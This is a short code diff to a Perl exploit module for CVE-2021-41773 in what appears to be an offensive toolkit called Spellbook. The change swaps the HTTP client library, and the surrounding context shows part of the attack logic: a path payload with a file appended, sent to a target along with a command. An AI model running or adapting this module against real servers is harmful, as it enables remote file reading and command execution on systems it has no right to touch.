@@ -2,7 +2,7 @@ package Spellbook::Advisory::CVE_2021_41773 {
     use strict;
     use warnings;
     use Try::Tiny;
-    use LWP::UserAgent;
+    use Spellbook::Core::UserAgent;
 
     sub new {
         my ($self, $parameters) = @_;
@@ -33,7 +33,7 @@ package Spellbook::Advisory::CVE_2021_41773 {
                 $payload = $payload . $file;
             }
 
-            my $useragent = LWP::UserAgent -> new();
+            my $useragent = Spellbook::Core::UserAgent -> new();
             my $request   = $useragent -> get(
                "https://" . $target . $payload, 
                 Content => $command || " "
